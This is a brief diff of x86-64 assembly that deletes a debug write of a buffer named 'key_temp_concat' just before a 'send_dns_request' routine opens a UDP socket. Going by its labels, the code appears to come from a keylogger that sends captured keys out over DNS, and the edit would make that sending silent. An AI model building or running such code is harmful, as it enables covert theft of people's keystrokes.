@@ -96,12 +96,6 @@ test_concat_size:
     jmp reading_new_key
 
 send_dns_request:
-    mov rax, 1
-    mov rdi, 1
-    mov rsi, key_temp_concat
-    mov rdx, 10
-    syscall
-
     mov rax, 41         ; sys_socket
     mov rdi, 2          ; AF_INET
     mov rsi, 2          ; SOCK_DGRAM
